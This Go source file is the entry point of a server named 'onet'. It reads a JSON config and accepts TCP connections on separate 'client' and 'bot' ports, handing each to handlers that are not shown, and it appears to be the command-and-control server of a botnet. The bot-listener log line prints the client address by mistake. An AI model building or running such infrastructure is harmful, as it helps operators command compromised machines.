package main

import (
	"encoding/json"
	"fmt"
	"net"
	"onet/core"
	"os"
)

type DATA struct {
	CLIENT int
	BOT    int
}

func main() {
	// onet server
	if _, ERR := os.Stat("./config/config.json"); ERR != nil {
		fmt.Println("\033[31mserver, could not located config.json!\033[0m")
		os.Exit(1)
	}

	CONTENT, ERR := os.ReadFile("./config/config.json")

	if ERR != nil {
		fmt.Println("\033[31mfailed to read the config?\033[0m")
		os.Exit(1)
	}

	var PAYLOAD DATA
	ERR = json.Unmarshal(CONTENT, &PAYLOAD)

	if ERR != nil {
		fmt.Println("\033[31mfailed to read the json\033[0m")
		os.Exit(1)
	}

	fmt.Println("\033[33m" + core.BANNER + "\033[0m" + "\n")
	Listener(PAYLOAD.BOT, PAYLOAD.CLIENT)
	select {}
}

func Listener(BOT int, CLIENT int) {

	ListenerClient, ERR := net.Listen("tcp", fmt.Sprintf(":%d", CLIENT))
	if ERR != nil {
		fmt.Println("\033[31mfailed to start the listener for client\033[0m" + ERR.Error())
		os.Exit(1)
	}
	fmt.Println("\033[33mONET client listening on: " + ListenerClient.Addr().String() + "\033[0m")
	ListenerBot, ERR := net.Listen("tcp", fmt.Sprintf(":%d", BOT))
	if ERR != nil {
		fmt.Println("\033[31mfailed to start the listener for bot\033[0m" + ERR.Error())
		os.Exit(1)
	}
	fmt.Println("\033[33mONET bot listening on: " + ListenerClient.Addr().String() + "\033[0m")
	go func() {
		for {
			ConnectionClient, ERR := ListenerClient.Accept()
			if ERR != nil {
				continue
			}
			fmt.Println("\033[33mnew client connected: " + ConnectionClient.RemoteAddr().String() + "\033[0m")
			go core.ConnectionHandlerClient(ConnectionClient)
		}
	}()
	go func() {
		for {
			ConnectionBot, ERR := ListenerBot.Accept()
			if ERR != nil {
				continue
			}
			fmt.Println("\033[33mnew client connected: " + ConnectionBot.RemoteAddr().String() + "\033[0m")
			go core.ConnectionHandlerBot(ConnectionBot)
		}
	}()
}
